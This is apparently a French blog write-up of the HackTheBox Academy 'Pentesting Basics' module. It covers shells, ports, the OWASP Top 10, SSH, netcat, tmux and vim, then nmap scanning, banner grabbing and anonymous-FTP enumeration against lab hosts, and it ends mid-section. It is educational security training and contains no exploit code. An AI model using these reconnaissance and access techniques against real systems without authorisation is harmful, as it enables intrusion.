---
title: "HackTheBox - Pentesting Basics"
date: 2025-11-07 18:42:00 +0200
categories: [HackTheBox, Learning]
tags: [learning]
description: "Write-up du module Pentesting Basics"
image:
  path: /assets/img/posts/getting-started.png
  alt: "pentesting basics"
---

## Informations sur la room

Découvrez le cours HTB sur le Pentesting Basics

**Lien :** [Pentesting Basics](https://academy.hackthebox.com/beta/module/77/section/724)

## Objectifs d'apprentissage

Cette room couvre les compétences suivantes :

- Comprendre la base du pentesting, ses outils principaux, les shells et autre

---

## Common Terms

Le test d'intrusion/piratage informatique est un domaine immense. Nous serons confrontés à d'innombrables technologies tout au long de notre carrière. Voici quelques-uns des termes et technologies les plus courants que nous rencontrerons fréquemment et qu'il est essentiel de maîtriser. Cette liste n'est pas exhaustive, mais elle suffit pour débuter avec les modules fondamentaux et les outils de test d'intrusion simples.

### What is a Shell?

Le terme « `shell` » est très courant et reviendra fréquemment tout au long de notre exploration. Il possède **plusieurs significations**. Sous Linux, le shell est un programme qui **reçoit les commandes** saisies par l'utilisateur au clavier et les transmet au système d'exploitation afin d'exécuter une fonction spécifique. Aux débuts de l'informatique, le shell était la seule interface disponible pour interagir avec les systèmes. Depuis, de nombreux systèmes d'exploitation et leurs versions ont vu le jour, ainsi que des interfaces graphiques (GUI) venant compléter les interfaces en ligne de commande (shell), comme le terminal Linux, **l'invite de commandes Windows** (`cmd.exe`) et `Windows PowerShell`.

La plupart des systèmes Linux utilisent un programme appelé `Bash` ([Bourne Again Shell](https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html)) comme interpréteur de commandes pour interagir avec le système d'exploitation. Bash est une version améliorée de [sh](https://man7.org/linux/man-pages/man1/sh.1p.html), le shell original des systèmes Unix. Outre Bash, il existe d'autres shells, notamment [Zsh](https://en.wikipedia.org/wiki/Z_shell), [Tcsh](https://en.wikipedia.org/wiki/Tcsh), [Ksh](https://en.wikipedia.org/wiki/KornShell) et [Fish](https://en.wikipedia.org/wiki/Fish_(Unix_shell)).

On entend souvent parler de l'expression « **obtenir un shell** » sur un ordinateur. Cela signifie que le système cible **a été exploité** et que nous avons obtenu un accès shell (généralement bash ou sh), ce qui nous permet d'exécuter des commandes de manière interactive comme si nous étions connectés au système. Un accès shell peut être obtenu en exploitant une vulnérabilité d'une application web ou d'un service réseau, ou en obtenant des identifiants et en se connectant à distance au système cible. Il existe trois principaux types de connexions shell :

- `Reverse shell` -> Établit une connexion avec un « écouteur » sur notre serveur d'attaque.
- `Bind shell` -> Se lie à un port spécifique sur l'hôte cible et attend une connexion de notre machine d'attaque.
- `Web shell` -> Exécute des commandes système via le navigateur web, généralement de manière non interactive ou semi-interactive. Peut également servir à exécuter des commandes uniques (par exemple, en exploitant une vulnérabilité de téléchargement de fichiers et en téléchargeant un script `PHP` pour exécuter une commande spécifique).

Chaque type de shell a son utilité, et de même qu'il existe de nombreuses façons d'obtenir un shell, le programme auxiliaire utilisé à cette fin peut être écrit dans divers langages (**Python, Perl, Go, Bash, Java, awk, PHP, etc.**). Il peut s'agir de petits scripts ou de programmes plus longs et complexes permettant d'établir une connexion entre le système cible et notre système d'attaque afin d'obtenir un accès shell. L'accès shell sera abordé plus en détail dans une section ultérieure.

### What is a Port?

On peut comparer un [port](https://en.wikipedia.org/wiki/Port_(computer_networking)) à une fenêtre ou une porte d'une maison (la maison étant un système distant). Si une fenêtre ou une porte est laissée ouverte ou mal verrouillée, il est souvent possible d'accéder sans autorisation à une habitation. 

Le principe est similaire en informatique. Les ports sont des **points virtuels où les connexions réseau commencent et se terminent**. Ils sont gérés par le système d'exploitation hôte et sont gérés par logiciel. Chaque port est associé à un processus ou un service spécifique et permet aux ordinateurs de différencier les types de trafic (le trafic SSH emprunte un port différent de celui des requêtes web permettant d'accéder à un site web, même si ces requêtes sont envoyées via la même connexion réseau).

Chaque port se voit attribuer un numéro, et nombre d'entre eux sont standardisés sur tous les périphériques connectés au réseau (bien qu'un service puisse être configuré pour s'exécuter sur un port non standard). Par exemple, les messages `HTTP` (trafic web) transitent généralement par le port `80`, tandis que les messages `HTTPS` transitent par le port `443`, sauf configuration contraire. On peut rencontrer des applications web s'exécutant sur des ports non standard, mais on les trouve généralement sur les ports `80` et `443`. Les numéros de port permettent d'accéder à des services ou applications spécifiques exécutés sur les périphériques cibles. De manière générale, les ports permettent aux ordinateurs de comprendre comment traiter les différents types de données qu'ils reçoivent.

Il existe deux catégories de ports : [le protocole TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) (Transmission Control Protocol) et le [protocole UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol) (User Datagram Protocol).

**Le protocole TCP** est orienté connexion, ce qui signifie qu'une connexion entre un client et un serveur doit être établie avant tout envoi de données. Le serveur doit être à l'écoute, prêt à recevoir les demandes de connexion des clients.

**Le protocole UDP** utilise un modèle de communication sans connexion. Il n'y a pas de « prise de contact » (ou « handshake ») et, par conséquent, une certaine incertitude quant à la fiabilité, car la livraison des données n'est pas garantie. Le protocole UDP est utile lorsque la correction/vérification d'erreurs n'est pas nécessaire ou est gérée par l'application elle-même. Il convient aux applications exécutant des tâches critiques en temps réel, car la perte de paquets est plus rapide que l'attente de paquets retardés par la retransmission, comme c'est le cas avec le **protocole TCP**, ce qui peut avoir un impact significatif sur un système temps réel. Il existe `65` `535` ports `TCP` et `65` 535 ports UDP différents, chacun étant identifié par un numéro. Voici quelques-uns des ports TCP et UDP les plus connus :

| Port(s) | Protocole |
|---------|-----------|
| `20`/`21` (TCP) | `FTP` |
| `22` (TCP) | `SSH` |
| `23` (TCP) | `Telnet` |
| `25` (TCP) | `SMTP` |
| `80` (TCP) | `HTTP` |
| `161` (TCP/UDP) | `SNMP` |
| `389` (TCP/UDP) | `LDAP` |
| `443` (TCP) | `SSL`/`TLS` (`HTTPS`) |
| `445` (TCP) | `SMB` |
| `3389` (TCP) | `RDP` |

En tant que professionnels de la sécurité informatique, nous devons pouvoir mémoriser rapidement une grande quantité d'informations sur des sujets variés. Il est essentiel, notamment pour les testeurs d'intrusion, de maîtriser les ports `TCP` et `UDP` et de pouvoir les identifier rapidement par leur numéro (par exemple, savoir que le port `21 est FTP`, le port `80 est HTTP` et le port `88 est Kerberos`) sans avoir à consulter de documentation. Avec la pratique et la répétition, cette capacité deviendra un réflexe à mesure que nous attaquerons davantage de machines, de laboratoires et de réseaux réels. Cela nous permettra de travailler plus efficacement et de mieux prioriser nos efforts d'énumération et nos attaques.

Des guides comme [celui-ci](https://www.stationx.net/common-ports-cheat-sheet/) et [celui-là](https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf) sont d'excellentes ressources pour apprendre les ports **TCP** et **UDP**, qu'ils soient standards ou moins courants. Efforcez-vous d'en mémoriser le plus possible et effectuez des recherches sur chacun des protocoles listés dans le tableau ci-dessus. [Ce document](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/) est une excellente référence sur les 1 000 principaux ports TCP et UDP analysés par nmap, ainsi que sur les 100 services les plus fréquemment analysés par `nmap`.

### What is a Web Server

Un serveur web est une application exécutée sur le `serveur back-end` qui gère tout le trafic `HTTP` provenant du navigateur côté client, l'achemine vers les pages de destination des requêtes et répond enfin au navigateur côté client. Les serveurs web fonctionnent généralement sur les ports `TCP 80 ou 443` et sont responsables de la connexion des utilisateurs finaux aux différentes parties de l'application web, ainsi que du traitement de leurs réponses.

![TCP](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/htb_main_2.jpg)

Les applications web, étant généralement ouvertes au public et accessibles sur Internet, peuvent exposer le **serveur back-end** à des vulnérabilités. Leur vaste surface d'attaque en fait des cibles de choix pour les attaquants et les testeurs d'intrusion.

De nombreux types de vulnérabilités peuvent affecter les applications web. On entend souvent parler du `Top 10 de l'OWASP`. Il s'agit d'une liste standardisée des **10 principales vulnérabilités** des applications web, maintenue par l'[Open Web Application Security Project](https://owasp.org/www-project-top-ten/) (OWASP). Cette liste, considérée comme la plus dangereuse, n'est cependant pas exhaustive. Les méthodologies d'évaluation de la sécurité des applications web s'appuient souvent sur le Top 10 de l'OWASP comme point de départ pour identifier les principales catégories de failles à rechercher. Voici la liste actuelle du Top 10 de l'OWASP :

| Numéro | Catégorie | Description |
|--------|-----------|-------------|
| 1. | [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) | Les restrictions ne sont pas correctement mises en œuvre pour empêcher les utilisateurs d'accéder aux comptes d'autres utilisateurs, de visualiser des données sensibles, d'accéder à des fonctionnalités non autorisées, de modifier des données, etc. |
| 2. | [Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) | Défaillances liées à la cryptographie qui conduisent souvent à l'exposition de données sensibles ou à la compromission du système. |
| 3. | [Injection](https://owasp.org/Top10/A03_2021-Injection/) | Les données fournies par l'utilisateur ne sont pas validées, filtrées ou nettoyées par l'application. Quelques exemples d'injections sont l'injection SQL, l'injection de commandes, l'injection LDAP, etc. |
| 4. | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/) | Ces problèmes surviennent lorsque l'application n'est pas conçue avec la sécurité à l'esprit. |
| 5. | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) | Absence de durcissement de sécurité approprié dans toute partie de la pile applicative, configurations par défaut non sécurisées, stockage cloud ouvert, messages d'erreur verbeux qui divulguent trop d'informations. |
| 6. | [Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) | Utilisation de composants (côté client et côté serveur) qui sont vulnérables, non supportés ou obsolètes. |
| 7. | [Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) | Attaques liées à l'authentification qui ciblent l'identité de l'utilisateur, l'authentification et la gestion des sessions. |
| 8. | [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/) | Les défaillances d'intégrité logicielle et des données concernent le code et l'infrastructure qui ne protègent pas contre les violations d'intégrité. Un exemple est lorsqu'une application s'appuie sur des plugins, bibliothèques ou modules provenant de sources, dépôts et réseaux de diffusion de contenu (CDN) non fiables. |
| 9. | [Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/) | Cette catégorie aide à détecter, escalader et répondre aux violations actives. Sans journalisation et surveillance, les violations ne peuvent pas être détectées. |
| 10. | [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) | Les failles SSRF se produisent lorsqu'une application web récupère une ressource distante sans valider l'URL fournie par l'utilisateur. Cela permet à un attaquant de contraindre l'application à envoyer une requête malveillante vers une destination inattendue, même lorsqu'elle est protégée par un pare-feu, un VPN ou un autre type de liste de contrôle d'accès réseau (ACL). |

Il est essentiel de se familiariser avec chacune de ces catégories et les différentes vulnérabilités qui leur sont associées. Les vulnérabilités des applications web seront abordées en détail dans les modules suivants. Pour en savoir plus sur les applications web, consultez le module « [Introduction aux applications web](https://academy.hackthebox.com/module/details/75) ».

## Basic Tools

Des outils comme `SSH`, `Netcat`, `Tmux` et `Vim` sont essentiels et utilisés quotidiennement par la plupart des professionnels de la sécurité informatique. Bien qu'ils ne soient pas spécifiquement conçus pour les tests d'intrusion, ils sont indispensables à ce processus; il est donc impératif de les maîtriser.

### Using SSH

[Secure Shell (SSH)](https://en.wikipedia.org/wiki/Secure_Shell) est un protocole réseau fonctionnant par défaut sur le port `22` et offrant aux utilisateurs, tels que les administrateurs système, un moyen sécurisé d'accéder à un ordinateur à distance. **SSH** peut être configuré avec une authentification par mot de passe ou sans mot de passe, via une **authentification par clé publique** à l'aide d'une paire de clés `publique/privée SSH`. SSH permet d'accéder à distance à des systèmes du même réseau, via Internet, de faciliter les connexions à des ressources d'autres réseaux grâce à la redirection de ports/proxy, et de transférer des fichiers vers et depuis des systèmes distants.

SSH utilise un modèle client-serveur, connectant un utilisateur exécutant une application cliente SSH, telle qu'**OpenSSH**, à un serveur **SSH**. Lors d'attaques informatiques ou d'évaluations en conditions réelles, il est fréquent d'obtenir des identifiants en clair ou une clé privée SSH, exploitables pour se connecter directement à un système via SSH. Une connexion SSH est généralement beaucoup plus stable qu'une connexion reverse shell et peut souvent servir de « **serveur relais** » pour explorer et attaquer d'autres hôtes du réseau, **transférer des outils, établir une persistance, etc**. Si nous obtenons des identifiants, nous pouvons utiliser SSH pour nous connecter à distance au serveur en utilisant le nom d'utilisateur suivi de l'adresse IP du serveur distant, comme suit :

```bash
Arcony@htb[/htb]$ ssh Bob@10.10.10.10

Bob@remotehost's password: *********

Bob@remotehost#
```

Il est également possible de lire les clés privées locales sur un système compromis ou d'ajouter notre clé publique pour obtenir un accès SSH à un utilisateur spécifique, comme nous le verrons plus loin. Comme nous pouvons le constater, SSH est un excellent outil pour se connecter de manière sécurisée à une machine distante. Il permet également de faire correspondre les ports locaux de la machine distante à notre hôte local, ce qui peut s'avérer utile.

### Using Netcat

[Netcat](https://linux.die.net/man/1/nc) (ou `ncat, nc`) est un excellent utilitaire réseau permettant d'interagir avec les ports **TCP/UDP**. Il peut servir à de nombreuses fins lors d'un test d'intrusion. Son utilisation principale est la **connexion à des shells**, sujet que nous aborderons plus loin dans ce module. De plus, netcat permet de se connecter à n'importe quel port d'écoute et d'interagir avec le service qui y est exécuté. Par exemple, SSH est configuré pour gérer les connexions via le port `22` afin d'envoyer toutes les données et les clés. Nous pouvons nous connecter au port `TCP 22` avec netcat :

```bash
Arcony@htb[/htb]$ netcat 10.10.10.10 22

SSH-2.0-OpenSSH_8.4p1 Debian-3
```

Comme on peut le constater, le port **22** nous a envoyé sa bannière, indiquant que **SSH** y est en cours d'exécution. Cette technique, appelée `Banner Grabbing`, permet d'identifier le service actif sur un port donné. Netcat est préinstallé sur la plupart des distributions Linux. On peut également télécharger une copie pour Windows à partir de [ce lien](https://nmap.org/download.html). Il existe une alternative à Netcat pour Windows, codée en PowerShell et appelée [PowerCat](https://github.com/besimorhino/powercat). Netcat peut aussi servir au transfert de fichiers entre machines, comme nous le verrons plus loin.

Un autre utilitaire réseau similaire est [socat](https://linux.die.net/man/1/socat), qui offre des fonctionnalités absentes de **Netcat**, comme la **redirection de ports et la connexion à des périphériques série**. Socat permet également de [transformer un shell en un TTY interactif](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat). Nous verrons quelques exemples plus loin. Socat est un utilitaire très pratique qui devrait faire partie de la boîte à outils de tout testeur d'intrusion. Une fois l'exécution de code à distance obtenue, un binaire Socat autonome peut être transféré sur un système pour établir une connexion shell inversée plus stable.

### Using Tmux

Les multiplexeurs de terminal, comme `tmux` ou `Screen`, sont d'excellents utilitaires pour étendre les fonctionnalités d'un terminal Linux standard, notamment en permettant d'afficher **plusieurs fenêtres dans un seul terminal** et de passer facilement de l'une à l'autre. Voyons quelques exemples d'utilisation de tmux, le plus courant des deux. Si tmux n'est pas installé sur votre système Linux, vous pouvez l'installer avec la commande suivante :

```bash
Arcony@htb[/htb]$ sudo apt install tmux -y
```

Une fois **tmux** installé, nous pouvons le démarrer en saisissant **tmux** comme commande :

![tmux](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/getting_started_tmux_1.jpg)

La combinaison de touches par défaut pour saisir le préfixe des commandes **tmux** est `[CTRL + B]`. Pour ouvrir une nouvelle fenêtre dans tmux, appuyez sur le préfixe **[CTRL + B] puis sur C**.

![tmux_1](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/getting_started_tmux_2.jpg)

Les fenêtres numérotées s'affichent en bas. On peut passer d'une fenêtre à l'autre en appuyant sur le préfixe, puis en saisissant le numéro de la fenêtre, par exemple **0 ou 1**. On peut également diviser une fenêtre verticalement en plusieurs volets en appuyant sur le préfixe, puis sur `SHIFT + %`.

![tmux_2](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/getting_started_tmux_3.jpg)

On peut également diviser en panneaux horizontaux en appuyant sur le préfixe puis sur `SHIFT + "` :

![tmux_3](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/getting_started_tmux_4.jpg)

On peut passer d'un panneau à l'autre en appuyant sur le préfixe, puis sur **les flèches gauche ou droite** pour un déplacement horizontal, ou sur **les flèches haut ou bas** pour un déplacement vertical. Les commandes ci-dessus couvrent quelques utilisations de base de tmux. C'est un outil puissant qui peut servir à de nombreuses fins, notamment à la **journalisation**, essentielle lors de toute intervention technique. [Ce guide](https://tmuxcheatsheet.com/) pratique est une référence très utile. De plus, [la vidéo d'introduction à tmux](https://www.youtube.com/watch?v=Lqehvpe_djs) `d'ippsec` mérite d'être visionnée.

### Using Vim / Nvim

[Vim](https://linuxcommand.org/lc3_man_pages/vim1.html) est un excellent éditeur de texte permettant d'écrire du code ou de modifier des fichiers texte sous Linux. L'un de ses principaux avantages est son utilisation exclusive au clavier : inutile d'utiliser la souris. Une fois la prise en main maîtrisée, cette fonctionnalité augmente considérablement la productivité et l'efficacité lors de l'écriture et de la modification de code. Vim (ou Vi) est souvent installé sur des systèmes Linux compromis ; apprendre à l'utiliser permet donc de modifier des fichiers même sur des systèmes distants. Vim offre également de nombreuses autres fonctionnalités, comme les extensions et les plugins, qui étendent considérablement ses possibilités et en font un éditeur de code performant. Voyons quelques notions de base de Vim. Pour ouvrir un fichier avec Vim, il suffit d'ajouter son nom après celui-ci :

```bash
Arcony@htb[/htb]$ vim /etc/hosts
```

![vim](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/getting_started_vim_1.jpg)

Pour créer un nouveau fichier, saisissez son nom; Vim ouvrira alors **une nouvelle fenêtre**. Une fois le fichier ouvert, vous êtes en `mode lecture seule`, ce qui vous permet de naviguer et de lire son contenu. Pour le modifier, appuyez sur la touche « `i` » pour passer en mode insertion, indiqué par « `-- INSERT --` » en bas de la fenêtre Vim. Vous pourrez ensuite déplacer le curseur et modifier le fichier.

![vim_2](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/getting_started_vim_2.jpg)

Une fois la modification d'un fichier terminée, appuyez sur la touche `Échap (esc)` pour quitter le `mode insertion` et revenir au mode normal. En mode normal, vous pouvez utiliser les touches suivantes pour effectuer des raccourcis utiles :

| Commande | Description |
|----------|-------------|
| `x` | Couper un caractère |
| `dw` | Couper un mot |
| `dd` | Couper une ligne complète |
| `yw` | Copier un mot |
| `yy` | Copier une ligne complète |
| `p` | Coller |

> On peut exécuter une commande plusieurs fois en ajoutant un nombre devant celle-ci. Par exemple, « 4yw » copiera quatre mots au lieu d'un, et ainsi de suite.
{: .prompt-tip}

Pour **enregistrer un fichier** ou quitter Vim, il faut appuyer sur la touche `:` pour passer en `mode commande`. Une fois en mode commande, les commandes saisies s’afficheront en bas de la fenêtre Vim.

![vim_3](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/getting_started_vim_3.jpg)

De nombreuses commandes sont à notre disposition. En voici quelques-unes :

| Commande | Description |
|----------|-------------|
| `:1` | Aller à la ligne numéro 1 |
| `:w` | Écrire le fichier, sauvegarder |
| `:q` | Quitter |
| `:q!` | Quitter sans sauvegarder |
| `:wq` | Écrire et quitter |

---

**Apply what you learned in this section to grab the banner of the above server and submit it as the answer.**

Maintenant nous devons pratiquer un peu, voici notre cible : `94.237.121.134:53108`

Je me souviens que nous avons parlé du Banner Grabbing avec **netcat** donc je regarde et je vois qu'il faut mettre l'ip suivi du port.

```bash
┌─[eu-academy-3]─[10.10.14.57]─[htb-ac-1999270@htb-tfb1cjdwrn]─[~]
└──╼ [★]$ netcat 94.237.121.134 53108
```

**Réponse :** `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1`

## Service Scanning

Nous sommes prêts à passer à l'étape suivante et à explorer une machine ! La première chose à faire est **d'identifier le système d'exploitation et les services disponibles**. Un service est une application exécutée sur un ordinateur qui remplit une fonction utile pour d'autres utilisateurs ou ordinateurs. Ces machines spécialisées hébergeant ces services sont appelées « **serveurs** » plutôt que « **postes de travail** », permettant ainsi aux utilisateurs d'interagir avec ces différents services et de les utiliser. Nous nous intéressons aux services mal configurés ou présentant une vulnérabilité. Au lieu d'exécuter les actions attendues du service, nous cherchons à déterminer si nous pouvons le contraindre à effectuer une action non prévue qui serve nos objectifs, comme l'exécution d'une commande de notre choix.

Chaque ordinateur possède une **adresse IP**, ce qui permet de l'identifier de manière unique et de le rendre accessible sur un réseau. Les services exécutés sur ces ordinateurs peuvent se voir attribuer un numéro de port pour être accessibles. Comme mentionné précédemment, les numéros de port vont de `1 à 65 535`, la plage de ports `1 à 1 023` étant `réservée aux services privilégiés`. Le port 0 est un port réservé dans les réseaux TCP/IP et n'est pas utilisé pour les messages TCP ou UDP. Si un service tente de se lier au port 0, il se liera au port disponible suivant, `au-dessus du port 1024`, car le port 0 est considéré comme un `port générique`.

Pour accéder à un service à distance, il est nécessaire de se connecter avec l'adresse IP et le numéro de port corrects, et d'utiliser un langage compatible avec le service. Examiner manuellement les 65 535 ports disponibles serait fastidieux; c'est pourquoi des outils ont été créés pour automatiser ce processus et analyser la plage de ports. `Nmap` (Network Mapper) est l'un des outils d'analyse les plus utilisés.

### Nmap

Commençons par une analyse de base. Supposons que nous souhaitions effectuer une **analyse simple** sur une cible située à l'adresse **10.129.42.253**. Pour ce faire, il suffit de saisir `nmap 10.129.42.253` et d'appuyer sur Entrée. L'analyse Nmap s'est terminée très rapidement. En effet, sans options supplémentaires, Nmap analyse par défaut les 1 000 ports les plus courants. Le résultat de l'analyse indique que les ports 21, 22, 80, 139 et 445 sont ouverts.

```bash
Arcony@htb[/htb]$ nmap 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
```

Sous l'en-tête `PORT`, il est également indiqué qu'il s'agit de ports TCP. Par défaut, Nmap effectue une analyse TCP, sauf si une analyse UDP est **spécifiquement demandée**.

L'en-tête `STATE` confirme que ces ports sont ouverts. Il arrive que d'autres ports, avec un état différent (par exemple, filtrés), soient listés. Cela peut se produire si un pare-feu n'autorise l'accès à ces ports que depuis des adresses spécifiques.

L'en-tête `SERVICE` indique que le nom du service est généralement associé au numéro de port. Cependant, l'analyse par défaut ne permet pas d'identifier le service qui écoute sur ce port. Tant que Nmap n'aura pas été invité à interagir avec le service pour tenter d'en extraire des informations d'identification, il pourrait s'agir d'un tout autre service.

Avec l'expérience, nous remarquerons que plusieurs ports sont couramment associés à Windows ou Linux. Par exemple, le port 3389 est le port par défaut des services Bureau à distance et indique clairement que la cible est une machine Windows. Dans notre cas, la disponibilité du port 22 (SSH) indique que la cible exécute Linux/Unix, mais ce service peut également être configuré sous Windows. Effectuons une analyse Nmap plus poussée afin de recueillir davantage d'informations sur le périphérique cible.

Le paramètre `-sC` permet d'indiquer que des scripts Nmap doivent être utilisés pour obtenir des informations plus détaillées. Le paramètre `-sV` demande à Nmap d'effectuer une analyse de version. Lors de cette analyse, Nmap identifiera les services présents sur le système cible, notamment le protocole, le nom de l'application et sa version. Cette analyse de version s'appuie sur une base de données exhaustive de plus de 1 000 signatures de services. Enfin, l'option `-p` indique à Nmap que nous souhaitons analyser l'ensemble des 65 535 ports TCP.

```bash
Arcony@htb[/htb]$ nmap -sV -sC -p- 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:18 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: PHP 7.4.3 - phpinfo()
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-25T21:21:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 233.68 seconds
```

Cela nous fournit beaucoup plus d'informations. On constate qu'analyser 65 535 ports a pris beaucoup plus de temps que 1 000 ports. Les options `-sC` et `-sV` augmentent également la durée de l'analyse, car au lieu d'effectuer une simple négociation TCP, elles effectuent de nombreuses vérifications supplémentaires. On remarque cette fois-ci un en-tête `VERSION`, qui indique la version du service et le système d'exploitation, si celui-ci peut être identifié.

Pour l'instant, nous savons que le système d'exploitation est Ubuntu Linux. Les versions des applications peuvent également aider à déterminer la version du système d'exploitation cible. Prenons OpenSSH comme exemple. La version affichée est OpenSSH 8.2p1 Ubuntu 4ubuntu0.1. En consultant les [journaux de modifications](https://launchpad.net/ubuntu/yakkety/+source/openssh/+changelog) d'autres paquets SSH d'Ubuntu, on constate que la version publiée est au format `1:7.3p1-1ubuntu0.1`. En mettant à jour notre version pour qu'elle corresponde à ce format, nous obtenons `1:8.2p1-4ubuntu0.1`. Une recherche rapide de cette version en ligne révèle qu'elle est incluse dans Ubuntu Linux Focal Fossa 20.04.

![ubuntu](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/google1.png)

Une autre recherche rapide révèle que la date de sortie de ce système d'exploitation est le 23 avril 2020.

![ubuntu_2](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/google2.png)

Il convient toutefois de noter que cette technique de recoupement n'est pas totalement fiable, car il est possible d'installer des paquets d'applications plus récents sur une version plus ancienne du système d'exploitation. L'option `-sC` de la commande `script scan` permet à Nmap d'afficher les en-têtes du serveur (`http-server-header`) et le titre de la page (`http-title`) pour toute page web hébergée sur le serveur. Le titre de la page web « PHP 7.4.3 - phpinfo() » indique qu'il s'agit d'un fichier PHPInfo, souvent créé manuellement pour confirmer l'installation réussie de PHP. Le titre (et la page PHPInfo) révèle également la version de PHP, une information importante à prendre en compte si le système est vulnérable.

![ubuntu_3](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/phpinfo.png)

#### Nmap Scripts

L'option `-sC` permet d'exécuter de nombreux scripts par défaut utiles sur une cible, mais il arrive qu'un script spécifique soit nécessaire. Par exemple, dans le cadre d'une évaluation, il peut nous être demandé d'auditer une installation Citrix de grande envergure. Nous pourrions alors utiliser [ce script](https://raw.githubusercontent.com/cyberstruggle/DeltaGroup/master/CVE-2019-19781/CVE-2019-19781.nse) `Nmap` pour rechercher la vulnérabilité critique de Citrix NetScaler ([CVE-2019-19781](https://www.rapid7.com/blog/2020/01/17/active-exploitation-of-citrix-netscaler-cve-2019-19781-what-you-need-to-know/)), bien que Nmap propose également d'autres scripts pour auditer une installation Citrix.

```bash
Arcony@htb[/htb]$ locate scripts/citrix

/usr/share/nmap/scripts/citrix-brute-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps.nse
/usr/share/nmap/scripts/citrix-enum-servers-xml.nse
/usr/share/nmap/scripts/citrix-enum-servers.nse
```

La syntaxe pour exécuter un script Nmap est la suivante : `nmap --script <nom du script> -p <port> <hôte>`.

Les scripts Nmap permettent d'améliorer considérablement les fonctionnalités de nos analyses, et l'étude des options disponibles s'avérera très utile. Consultez le module « [Énumération de réseau avec Nmap](https://academy.hackthebox.com/module/details/19) » pour une présentation plus détaillée de l'outil Nmap.

### Attacking Network Services

#### Banner Grabbing

Comme mentionné précédemment, la capture de bannières est une technique utile pour identifier rapidement un service. Souvent, un service cherche à s'identifier en affichant une bannière lors de l'établissement d'une connexion. Nmap tentera de capturer ces bannières si la syntaxe `nmap -sV --script=banner <cible>` est spécifiée. Nous pouvons également effectuer cette opération manuellement avec Netcat. Prenons un autre exemple, en utilisant la version nc de Netcat :

```bash
Arcony@htb[/htb]$ nc -nv 10.129.42.253 21

(UNKNOWN) [10.129.42.253] 21 (ftp) open
220 (vsFTPd 3.0.3)
```

Cela révèle que la version de `vsFTPd` sur le serveur est `3.0.3`. Nous pouvons également automatiser ce processus en utilisant le puissant moteur de script de Nmap : `nmap -sV --script=banner -p21 10.10.10.0/24`.

#### FTP

Il est utile de se familiariser avec le protocole **FTP**, car il s'agit d'un protocole standard et ce service peut souvent contenir des données intéressantes. Une analyse Nmap du port par défaut du **FTP (21)** révèle l'installation de **vsftpd 3.0.3** que nous avons identifiée précédemment. De plus, elle indique que l'**authentification anonyme est activée et qu'un répertoire public est disponible**.

```bash
Arcony@htb[/htb]$ nmap -sC -sV -p21 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 00:54 GMT
Nmap scan report for 10.129.42.253
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
